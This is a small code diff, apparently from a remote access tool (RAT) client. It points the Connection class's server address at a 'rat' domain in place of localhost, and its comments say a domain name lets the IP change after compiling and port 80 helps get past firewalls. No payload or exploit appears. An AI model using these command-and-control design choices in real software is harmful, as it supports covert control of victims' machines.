@@ -28,8 +28,7 @@ public class Connection {
 	 * Server url.
 	 * Using a domain name to be able to change IP once compiled.
 	 */
-	// private static final String SERVER_URL = "http://rat.chalier.fr";
-	private static final String SERVER_URL = "127.0.0.1";
+	private static final String SERVER_URL = "rat.chalier.fr";
 	
 	/**
 	 * Server port. 80 by default, as often opened in firewalls.
